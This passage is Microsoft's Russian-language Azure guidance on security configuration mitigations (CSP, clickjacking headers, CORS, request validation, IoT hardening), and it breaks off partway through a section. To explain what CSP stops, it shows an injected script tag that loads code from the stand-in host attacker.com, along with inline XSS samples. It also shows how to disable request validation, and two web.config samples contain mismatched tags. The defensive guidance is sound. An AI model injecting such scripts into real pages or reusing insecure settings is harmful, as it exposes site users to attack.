---
title: Управление конфигурацией для средства моделирования угроз Microsoft
titleSuffix: Azure
description: Сведения об управлении конфигурацией для Threat Modeling Tool. См. сведения об устранении рисков и просмотр примеров кода.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: 867cb1b7a1f3a1f0b427282c648d411d0ca4f81f
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 03/19/2021
ms.locfileid: "94517490"
---
# <a name="security-frame-configuration-management--mitigations"></a>Механизм безопасности. Управление конфигурацией | Устранение рисков 
| Продукт или служба | Статья |
| --------------- | ------- |
| **Веб-приложение** | <ul><li>[Реализуйте политику безопасности содержимого (CSP) и отключите встроенный скрипт JavaScript](#csp-js)</li><li>[Включите фильтр межсайтовых сценариев в браузере](#xss-filter)</li><li>[Отключите трассировку и отладку приложений ASP.NET перед развертыванием](#trace-deploy)</li><li>[Получайте доступ к сторонним скриптам JavaScript только из доверенных источников](#js-trusted)</li><li>[Внедрите защиту от кликджекинга на страницах ASP.NET](#ui-defenses)</li><li>[Настройте доступ к веб-приложениям ASP.NET с включенной технологией CORS только из доверенных источников](#cors-aspnet)</li><li>[Включите атрибут ValidateRequest на страницах ASP.NET](#validate-aspnet)</li><li>[Используйте локально размещенные последние версии библиотек JavaScript](#local-js)</li><li>[Отключите автоматическое обнаружение типов MIME](#mime-sniff)</li><li>[Удалите стандартные заголовки сервера на веб-сайтах Microsoft Azure во избежание использования отпечатка](#standard-finger)</li></ul> |
| **База данных** | <ul><li>[Настройка брандмауэра Windows для доступа к компоненту Database Engine](#firewall-db)</li></ul> |
| **Веб-интерфейс API** | <ul><li>[Настройте доступ к веб-API ASP.NET с включенной технологией CORS только из доверенных источников](#cors-api)</li><li>[Шифруйте разделы файлов конфигурации веб-API, содержащие конфиденциальные данные](#config-sensitive)</li></ul> |
| **Устройство IoT** | <ul><li>[Обеспечьте безопасность всех интерфейсов администратора с использованием надежных учетных данных](#admin-strong)</li><li>[Защитите устройства от выполнения неизвестного кода](#unknown-exe)</li><li>[Шифруйте разделы операционной системы и дополнительные разделы устройства Интернета вещей с помощью BitLocker](#partition-iot)</li><li>[Включите минимальное количество служб и функций на устройстве](#min-enable)</li></ul> |
| **Полевой шлюз Интернета вещей** | <ul><li>[Шифруйте разделы операционной системы и дополнительные разделы полевого шлюза Интернета вещей с помощью BitLocker](#field-bit-locker)</li><li>[Измените учетные данные для входа в систему полевого шлюза по умолчанию во время установки](#default-change)</li></ul> |
| **Облачный шлюз Интернета вещей** | <ul><li>[Реализуйте процесс обновления встроенного ПО подключенных устройств в облачном шлюзе](#cloud-firmware)</li></ul> |
| **Граница доверия между компьютерами** | <ul><li>[Настройте элементы управления безопасностью конечных точек устройства в соответствии с политиками организации](#controls-policies)</li></ul> |
| **Хранилище Azure** | <ul><li>[Обеспечьте безопасное управление ключами доступа к хранилищу Azure](#secure-keys)</li><li>[Настройте доступ к службе хранилища Azure с включенной технологией CORS только из доверенных источников](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Включите компонент регулирования служб WCF](#throttling)</li><li>[Применяйте раскрытие информации через метаданные, переданные WCF](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Реализуйте политику безопасности содержимого (CSP) и отключите встроенный скрипт JavaScript

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Общие сведения о политике безопасности содержимого](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [справочные материалы по политике безопасности содержимого](https://content-security-policy.com/), [сведения о компонентах обеспечения безопасности](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [общие сведения о политике безопасности содержимого](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [сведения об использовании CSP](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Шаги** | <p>Политика безопасности содержимого (CSP) — это многоуровневый механизм обеспечения безопасности, рекомендованный консорциумом W3C, который позволяет владельцам веб-приложений управлять содержимым их сайтов. CSP добавляется в виде заголовка ответа HTTP на веб-сервере и принудительно применяется в браузерах на стороне клиента. Это разрешенная политика на основе списка. на веб-сайте можно объявить набор доверенных доменов, из которых можно загрузить активное содержимое, например JavaScript.</p><p>CSP предоставляет следующие преимущества безопасности.</p><ul><li>**Защита от межсайтового сценария**. Если страница уязвима к такому типу атак, злоумышленник может проникнуть на нее двумя способами:<ul><li>Внедрить `<script>malicious code</script>`. Злоумышленник не сможет проникнуть на страницу из-за базового ограничения 1 CSP.</li><li>Внедрить `<script src="http://attacker.com/maliciousCode.js"/>`. Эта атака не будет работать, так как домен, управляемый злоумышленником, не будет входить в список разрешенных доменов CSP.</li></ul></li><li>**Контроль над извлечением данных**. Если любое вредоносное содержимое на веб-странице попытается подключиться к внешнему веб-сайту и украсть данные, CSP прервет подключение. Это связано с тем, что конечный домен не будет включен в список разрешенных CSP</li><li>**Защита от кликджекинга.** Кликджекинг — это метод атаки, с помощью которого злоумышленник может создать подлинный веб-сайт и вынудить пользователей щелкнуть элементы интерфейса. Сейчас защита от кликджекинга осуществляется с помощью заголовка ответа X-Frame-Options. Некоторые браузеры игнорируют этот заголовок и используют для защиты политику CSP.</li><li>**Информирование об атаках в режиме реального времени**. При обнаружении атаки путем внедрения кода на веб-сайте с поддержкой CSP браузеры автоматически отправляют уведомление на конечную точку, настроенную на веб-сервере. В этом случае CSP используется как система оповещений в режиме реального времени.</li></ul> |

### <a name="example"></a>Пример
Пример политики: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Эта политика позволяет скачивать скрипты только с сервера веб-приложения и сервера Google Analytics. Все остальные скрипты отклоняются. Если на веб-сайте включена политика CSP, некоторые функции отключаются автоматически (см. ниже). Это позволяет предотвратить выполнение межсайтовых сценариев. 

### <a name="example"></a>Пример
Встроенные скрипты выполняться не будут. Ниже приведены примеры встроенных скриптов. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Пример
Строки не будут рассматриваться в качестве кода. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Включите фильтр межсайтовых сценариев в браузере

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Фильтр защиты от межсайтовых сценариев](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Шаги** | <p>Конфигурация заголовка ответа X-XSS-Protection управляет фильтром выполнения межсайтовых сценариев в браузере. Этот заголовок ответа может иметь следующие значения.</p><ul><li>`0:`. Это значение позволяет отключить фильтр.</li><li>`1: Filter enabled`. При обнаружении выполнения межсайтового сценария браузер очищает страницу, чтобы остановить атаку.</li><li>`1: mode=block : Filter enabled`. При обнаружении выполнения межсайтового сценария браузер предотвращает обработку страницы, а не очищает ее.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Браузер очищает страницу и выводит сообщение о нарушении.</li></ul><p>Это функция браузера Chromium, которая использует сообщения о нарушениях для отправки сведений о нарушении в выбранный универсальный код ресурса (URI). Последние 2 параметра рассматриваются как безопасные значения.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Отключите трассировку и отладку приложений ASP.NET перед развертыванием

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Общие сведения об отладке ASP.NET](/previous-versions/ms227556(v=vs.140)), [Общие сведения о трассировке ASP.NET](/previous-versions/bb386420(v=vs.140)), [Практическое руководство по включению трассировки для приложения ASP.NET](/previous-versions/0x5wc973(v=vs.140)), [Практическое руководство по включению отладки для приложений ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx). |
| **Шаги** | Если трассировка страницы включена, каждый браузер, отправляющий к ней запрос, получает сведения о трассировке с данными о рабочем процессе и состоянии внутреннего сервера. Эти сведения могут быть секретными. Если включена отладка страницы, при возникновении ошибок на сервере все данные трассировки стека отправляются в браузер. Эти данные могут содержать секретные сведения о рабочем процессе сервера. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Получайте доступ к сторонним скриптам JavaScript только из доверенных источников

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Используйте сторонние скрипты JavaScript только из доверенных источников На соответствующих конечных точках всегда должен быть включен протокол TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Внедрите защиту от кликджекинга на страницах ASP.NET

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Памятка по защите от кликджекинга OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [внутренняя документация Internet Explorer по борьбе с кликджекингом при помощи заголовка ответа X-Frame-Options](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Шаги** | <p>Кликджекинг — это механизм обмана, при котором злоумышленник использует прозрачные или непрозрачные уровни, чтобы обманным путем заставить пользователя нажать кнопку или щелкнуть ссылку на другую страницу, когда он намеревается щелкнуть страницу верхнего уровня.</p><p>Такая многоуровневая структура достигается за счет создания вредоносной страницы в фрейме, который загружает страницу жертвы. Таким образом, злоумышленник перехватывает щелчки мыши, сделанные на странице, и перенаправляет пользователей на другую страницу, скорее всего, принадлежащую другому приложению или домену (или и тому, и другому). Чтобы предотвратить кликджекинг, задайте соответствующие заголовки HTTP-ответа X-Frame-Options, не разрешающие использовать фреймы из других доменов в браузере.</p>|

### <a name="example"></a>Пример
Заголовок X-FRAME-OPTIONS можно задать в файле IIS web.config. Фрагмент кода web.config для сайтов, не использующих фреймы, выглядит следующим образом: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Пример
Код web.config для сайтов, использующих фреймы только на страницах, расположенных в одном и том же домене, выглядит следующим образом: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Настройте доступ к веб-приложениям ASP.NET с включенной технологией CORS только из доверенных источников

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Веб-формы, MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | <p>Параметры безопасности веб-браузера предотвращают отправку запросов AJAX с веб-страницы к другому домену. Такое ограничение называется политикой одного источника. Эта политика предотвращает чтение вредоносным сайтом конфиденциальных данных с другого сайта. Тем не менее в некоторых случаях необходимо обеспечить безопасное предоставление API-интерфейсов, которые могут использовать другие сайты. Общий доступ к ресурсам независимо от источника (CORS) — это стандарт консорциума W3C, позволяющий серверу смягчить ограничения политики одного источника. С помощью CORS сервер может явным образом разрешить некоторые запросы независимо от источника, а другие — отклонить.</p><p>Технология CORS более безопасная и гибкая, чем предыдущие технологии, например JSONP. По сути, чтобы включить CORS, в код веб-приложения необходимо добавить несколько заголовков HTTP-ответа (Access-Control-*). Это можно сделать несколькими способами.</p>|

### <a name="example"></a>Пример
Если у вас есть доступ к файлу Web.config, то CORS можно добавить с помощью приведенного ниже кода. 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Пример
Если доступ к файлу web.config отсутствует, спецификацию CORS можно настроить, добавив следующий код CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Обратите внимание, что в качестве значения атрибута Access-Control-Allow-Origin необходимо задать конечный набор доверенных источников. При неправильной конфигурации этого параметра (например, если задать значение "*") вредоносные сайты смогут отправлять запросы независимо от источника к веб приложению без каких-либо ограничений, в результате чего приложение становится уязвимым к CSRF-атакам. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Включите атрибут ValidateRequest на страницах ASP.NET

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Веб-формы, MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Сведения о предотвращении атак путем внедрения кода с помощью функции проверки запросов](https://www.asp.net/whitepapers/request-validation) |
| **Шаги** | <p>Проверка запросов — это функция ASP.NET (начиная с версии 1.1), блокирующая прием содержимого с незашифрованным HTML-кодом на сервере. Эта функция помогает предотвращать некоторые атаки путем внедрения кода, с помощью которых злоумышленники могут оправлять неизвестный код скрипта клиента или HTML-код на сервер, сохранять его, а затем распространять другим пользователям. Мы настоятельно рекомендуем при необходимости проверять все входные данные и кодировать их в формате HTML.</p><p>Проверка запросов выполняется путем сравнения всех входящих данных со списком потенциально опасных значений. При выявлении совпадения ASP.NET вызывает исключение `HttpRequestValidationException`. По умолчанию функция проверки запросов включена.</p>|

### <a name="example"></a>Пример
Тем не менее эту функцию можно отключить на уровне страниц: 
```XML
<%@ Page validateRequest="false" %> 
```
Или на уровне приложения: 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Обратите внимание, что функция проверки запросов не поддерживается и не входит в конвейер MVC6. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Используйте локально размещенные последние версии библиотек JavaScript

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | <p>Разработчики, пользующиеся стандартными библиотеками JavaScript (например, JQuery), должны использовать их утвержденные версии, не имеющие известных проблем с безопасностью. Мы рекомендуем использовать последние версии библиотек, так как в них добавлены исправления проблем с безопасностью, обнаруженных в предыдущих версиях.</p><p>Если последний выпуск не поддерживается по причинам совместимости, используйте минимальные версии, приведенные ниже.</p><p>Минимальные допустимые версии:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**Веб-формы ASP.NET и Ajax**<ul><li>Веб-формы ASP.NET и Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Никогда не скачивайте какие-либо библиотеки JavaScript с внешних сайтов, например в общедоступной сети доставки содержимого.</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Отключите автоматическое обнаружение типов MIME

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Запись блога по безопасности IE8, часть 5 о комплексной защите](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [Список MIME-типов](https://en.wikipedia.org/wiki/Mime_type) |
| **Шаги** | Заголовок X-Content-Type-Options — это HTTP-заголовок, используя который разработчики могут запретить определение типов MIME содержимого. Этот заголовок обеспечивает защиту от атак путем определения типов MIME. Для каждой страницы, на которой может быть содержимое, управляемое пользователем, необходимо использовать HTTP-заголовок X-Content-Type-Options:nosniff. Чтобы включить требуемый заголовок глобально для всех страниц в приложении, выполните одно из следующих действий.|

### <a name="example"></a>Пример
Добавьте заголовок в файл web.config, если приложение размещено в службах IIS 7 и более поздних версий. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Пример
Добавьте заголовок в глобальной функции Application\_BeginRequest. 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Пример
Внедрите пользовательский HTTP-модуль. 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Пример
Чтобы включить требуемый заголовок только для определенных страниц, добавьте его в отдельные ответы: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Удалите стандартные заголовки сервера на веб-сайтах Microsoft Azure во избежание использования отпечатка

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-приложение | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | EnvironmentType: Azure |
| **Справочные материалы**              | [Сведения об удалении стандартных заголовков сервера на веб-сайтах Microsoft Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Шаги** | Такие заголовки, как Server, X-Powered-By, X-AspNet-Version, отображают сведения о сервере и базовых технологиях. Мы рекомендуем удалить эти заголовки, чтобы предотвратить использование отпечатка в приложении. |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Настройте брандмауэр Windows для доступа к ядру СУБД

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | База данных | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | SQL Azure, локальные |
| **Атрибуты**              | Отсутствуют, версия SQL: 12 |
| **Справочные материалы**              | [Как настроить брандмауэр базы данных SQL Azure](../../azure-sql/database/firewall-configure.md), [настроить брандмауэр Windows для доступа к ядро СУБД](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Шаги** | Системы брандмауэров предотвращают несанкционированный доступ к ресурсам компьютера. Чтобы получить доступ к экземпляру ядра СУБД SQL Server через брандмауэр, необходимо настроить брандмауэр на компьютере под управлением SQL Server. |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Настройте доступ к веб-API ASP.NET с включенной технологией CORS только из доверенных источников

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-API | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | MVC 5 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Статья о включении запросов независимо от источника в веб-API 2 ASP.NET](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [Поддержка CORS в веб-API 2 ASP.NET](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Шаги** | <p>Параметры безопасности веб-браузера предотвращают отправку запросов AJAX с веб-страницы к другому домену. Такое ограничение называется политикой одного источника. Эта политика предотвращает чтение вредоносным сайтом конфиденциальных данных с другого сайта. Тем не менее в некоторых случаях необходимо обеспечить безопасное предоставление API-интерфейсов, которые могут использовать другие сайты. Общий доступ к ресурсам независимо от источника (CORS) — это стандарт консорциума W3C, позволяющий серверу смягчить ограничения политики одного источника.</p><p>С помощью CORS сервер может явным образом разрешить некоторые запросы независимо от источника, а другие — отклонить. Технология CORS более безопасная и гибкая, чем предыдущие технологии, например JSONP.</p>|

### <a name="example"></a>Пример
Откройте файл App_Start/WebApiConfig.cs и добавьте в метод WebApiConfig.Register следующий код: 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Пример
Атрибут EnableCors можно применить к методам действий в контроллере следующим образом: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Обратите внимание, что в качестве значения атрибута EnableCors обязательно необходимо задать конечный набор доверенных источников. При неправильной конфигурации этого параметра (например, если задать значение "*") вредоносные сайты смогут отправлять запросы независимо от источника к API без каких-либо ограничений, в результате чего API становится уязвимым к CSRF-атакам. Атрибут EnableCors можно добавить на уровне контроллера. 

### <a name="example"></a>Пример
Чтобы отключить CORS в определенном методе класса, добавьте атрибут DisableCors следующим образом: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-API | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | MVC 6 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Статья о включении запросов независимо от источника в ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Шаги** | <p>В ASP.NET Core 1.0 запросы независимо от источника можно включить с помощью ПО промежуточного слоя или MVC. Если CORS включается через MVC, используются те же самые службы CORS, но без ПО промежуточного слоя.</p>|

**Способ 1**. Включение CORS с помощью ПО промежуточного слоя: Чтобы включить CORS для всего приложения, добавьте ПО промежуточного слоя CORS в конвейер запросов с помощью метода расширения UseCors. При добавлении ПО промежуточного слоя CORS вы можете применить политику независимо от источника с помощью класса CorsPolicyBuilder. Это можно осуществить двумя путями:

### <a name="example"></a>Пример
Первый способ — вызвать UseCors с помощью лямбда-выражения. Лямбда-выражение принимает объект CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Пример
Второй способ — определить одну или несколько именованных политик CORS, а затем выбрать политику по имени во время выполнения. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Способ 2**. Включение CORS в MVC. Разработчики также могут использовать MVC, чтобы применить CORS для конкретного действия, для контроллера или глобально для всех контроллеров.

### <a name="example"></a>Пример
Для конкретного действия. Чтобы указать политику CORS для определенного действия, добавьте в это действие атрибут [EnableCors]. Введите имя политики. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Пример
Для контроллера: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Пример
Глобально: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Обратите внимание, что в качестве значения атрибута EnableCors обязательно необходимо задать конечный набор доверенных источников. При неправильной конфигурации этого параметра (например, если задать значение "*") вредоносные сайты смогут отправлять запросы независимо от источника к API без каких-либо ограничений, в результате чего API становится уязвимым к CSRF-атакам. 

### <a name="example"></a>Пример
Чтобы отключить CORS для контроллера или действия, используйте атрибут [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Шифруйте разделы файлов конфигурации веб-API, содержащие конфиденциальные данные

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Веб-API | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Руководство. Шифрование разделов конфигурации в ASP.NET 2.0 с помощью DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [сведения об указании поставщика защищенной конфигурации](/previous-versions/68ze1hb2(v=vs.140)), [использование Azure Key Vault для защиты секретов приложения](/azure/architecture/multitenant-identity/web-api) |
| **Шаги** | Такие файлы конфигурации, как web.config и appsettings.json, часто используются для хранения конфиденциальной информации, включая имена пользователей, пароли, строки подключения к базам данных и ключи шифрования. Если эти данные не защищены, приложение становится уязвимым для злоумышленников, которые таким образом могут получить различные конфиденциальные сведения, например имена учетных записей пользователей, пароли, имена баз данных и имена серверов. На основе типа развертывания (Azure или локального) зашифруйте конфиденциальные разделы файлов конфигурации с помощью DPAPI или таких служб, как Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Обеспечьте безопасность всех интерфейсов администратора с использованием надежных учетных данных

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Все административные интерфейсы устройства или полевого шлюза должны быть защищены с использованием надежных учетных данных. Кроме того, также необходимо обеспечить защиту остальных предоставленных интерфейсов, например Wi-Fi, SSH, общих файловых ресурсов и FTP. Не следует использовать слабые пароли, заданные по умолчанию. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Защитите устройства от выполнения неизвестного кода

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Раздел о включении безопасной загрузки и шифрования BitLocker в Windows 10 IoT Базовая](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Шаги** | Функция "Безопасная загрузка UEFI" обеспечивает выполнение в системе только двоичных файлов, подписанных в определенных центрах. Эта функция предотвращает выполнение неизвестного кода на платформе и защищает систему от потенциальных проблем с безопасностью. Включите функцию "Безопасная загрузка UEFI" и укажите список доверенных центров сертификации, использующихся для подписания кода. Подпишите весь код, развернутый на устройстве, в одном из доверенных центров. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Шифруйте разделы операционной системы и дополнительные разделы устройства Интернета вещей с помощью BitLocker

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
